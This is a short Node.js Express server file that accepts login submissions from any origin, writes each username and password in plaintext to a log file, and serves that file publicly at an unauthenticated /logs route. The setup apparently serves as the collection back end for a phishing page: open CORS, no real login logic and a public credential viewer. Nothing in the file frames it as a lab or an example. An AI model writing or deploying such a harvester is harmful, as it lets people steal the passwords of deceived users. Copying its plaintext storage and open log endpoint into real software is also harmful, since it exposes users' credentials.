const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

const app = express();

// Middleware
app.use(cors({
    origin: "*"
}));

app.use(express.json());

// Root route
app.get("/", (req, res) => {
    res.send("Server is running");
});

// File path
const LOG_FILE = path.join(__dirname, "logins.txt");

// Login route
app.post("/login", (req, res) => {
    const { username, password } = req.body;

    const time = new Date().toISOString();

    const logEntry =
        `${time} | username=${username} | password=${password}\n`;

    fs.appendFile(LOG_FILE, logEntry, (err) => {
        if (err) {
            console.error("Error saving login:", err);

            return res.status(500).json({
                message: "Failed to save login"
            });
        }

        console.log("Saved:", logEntry.trim());

        res.json({
            message: "Login received and saved"
        });
    });
});

// Logs viewer route
app.get("/logs", (req, res) => {
    fs.readFile(LOG_FILE, "utf8", (err, data) => {
        if (err) return res.send("No logs yet");
        res.type("text/plain").send(data);
    });
});

// Hosting-safe port
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
